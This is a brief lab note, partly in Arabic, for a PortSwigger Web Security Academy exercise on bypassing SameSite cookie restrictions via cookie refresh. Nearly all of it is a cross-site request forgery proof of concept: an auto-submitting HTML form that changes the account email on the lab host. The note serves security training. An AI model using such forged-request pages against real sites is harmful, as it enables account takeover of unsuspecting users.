# Lab : SameSite Lax bypass via cookies refresh

https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh

- الفكره من الLab ده

```bash
1.     <form action="https://0a6a00fc03da12c1804bd7d3002d004f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="iwanacary&#64;aaaaaaaa&#46;CA" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      
      document.forms[0].submit();
    </script>

```
